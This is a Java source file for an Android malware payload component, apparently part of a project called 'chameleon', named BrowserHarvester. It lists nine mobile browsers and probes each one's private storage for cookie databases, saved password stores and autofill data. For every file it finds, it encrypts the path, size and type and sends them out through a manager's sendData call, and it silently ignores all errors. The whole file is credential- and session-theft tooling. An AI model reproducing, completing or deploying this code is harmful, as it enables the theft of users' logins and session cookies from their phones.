package com.chameleon.payload.harvester;

import android.content.Context;
import android.util.Log;
import com.chameleon.payload.util.Crypto;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.*;

public class BrowserHarvester {
    private static final String TAG = "BrowserHarvester";
    private final Context context;
    private final HarvesterManager manager;

    public BrowserHarvester(Context context, HarvesterManager manager) {
        this.context = context;
        this.manager = manager;
    }

    private static final String[][] BROWSER_PATHS = {
        {"com.android.chrome", "Chrome"},
        {"org.mozilla.firefox", "Firefox"},
        {"com.brave.browser", "Brave"},
        {"com.opera.browser", "Opera"},
        {"com.microsoft.emmx", "Edge"},
        {"com.sec.android.app.sbrowser", "Samsung Internet"},
        {"com.android.browser", "Stock Browser"},
        {"org.mozilla.focus", "Firefox Focus"},
        {"com.duckduckgo.mobile.android", "DuckDuckGo"}
    };

    public void collectBrowserData() {
        Log.i(TAG, "Collecting browser data...");
        for (String[] browser : BROWSER_PATHS) {
            String pkg = browser[0];
            String name = browser[1];
            collectCookies(pkg, name);
            collectPasswords(pkg, name);
            collectWebData(pkg, name);
        }
    }

    private void collectCookies(String pkg, String name) {
        String[] cookiePaths = {
            "/data/data/" + pkg + "/app_chrome/Default/Cookies",
            "/data/data/" + pkg + "/app_chrome/Default/Cookies-journal",
            "/data/data/" + pkg + "/app_chrome/Default/Network/Cookies",
            "/data/data/" + pkg + "/files/Cookies",
            "/data/data/" + pkg + "/databases/webviewCookiesChromium.db",
            "/data/data/" + pkg + "/databases/webviewCookiesChromiumPrivate.db"
        };
        for (String path : cookiePaths) {
            checkFile(path, "cookie", name);
        }
    }

    private void collectPasswords(String pkg, String name) {
        String[] passwordPaths = {
            "/data/data/" + pkg + "/app_chrome/Default/Login Data",
            "/data/data/" + pkg + "/app_chrome/Default/Login Data-journal",
            "/data/data/" + pkg + "/databases/login.db",
            "/data/data/" + pkg + "/databases/passwords.db"
        };
        for (String path : passwordPaths) {
            checkFile(path, "password", name);
        }
    }

    private void collectWebData(String pkg, String name) {
        String[] webDataPaths = {
            "/data/data/" + pkg + "/app_chrome/Default/Web Data",
            "/data/data/" + pkg + "/app_chrome/Default/Web Data-journal",
            "/data/data/" + pkg + "/databases/webdata.db",
            "/data/data/" + pkg + "/databases/autofill.db"
        };
        for (String path : webDataPaths) {
            checkFile(path, "webdata", name);
        }
    }

    private void checkFile(String path, String type, String browserName) {
        try {
            File file = new File(path);
            if (file.exists()) {
                JSONObject data = new JSONObject();
                data.put("browser", browserName);
                data.put("path", path);
                data.put("size", file.length());
                data.put("type", type);
                data.put("last_modified", file.lastModified());
                byte[] encrypted = Crypto.encrypt(data.toString().getBytes());
                manager.sendData("session", encrypted);
                Log.d(TAG, "Found " + type + ": " + path + " (" + file.length() + " bytes)");
            }
        } catch (Exception ignored) {}
    }
}
